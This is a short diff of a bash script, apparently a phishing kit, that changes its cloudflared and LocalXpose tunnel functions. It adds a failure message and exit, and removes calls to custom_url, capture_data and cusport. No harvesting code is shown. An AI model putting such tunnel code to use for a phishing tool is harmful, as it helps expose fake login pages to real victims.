@@ -337,8 +337,12 @@ start_cloudflared() {
 			return 0
 		fi
 		attempt=$((attempt + 1))
-	custom_url "$cldflr_url"
-	capture_data
+	done
+	
+	# If we get here, cloudflared failed
+	echo -e "\n${RED}[${WHITE}!${RED}]${RED} Failed to establish cloudflared tunnel"
+	echo -e "${ORANGE}[${WHITE}!${ORANGE}]${ORANGE} Please restart and try again${WHITE}"
+	exit 1
 }
 
 localxpose_auth() {
@@ -360,7 +364,6 @@ localxpose_auth() {
 
 ## Start LocalXpose (Again...)
 start_loclx() {
-	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; localxpose_auth; }
 	echo -e "\n"
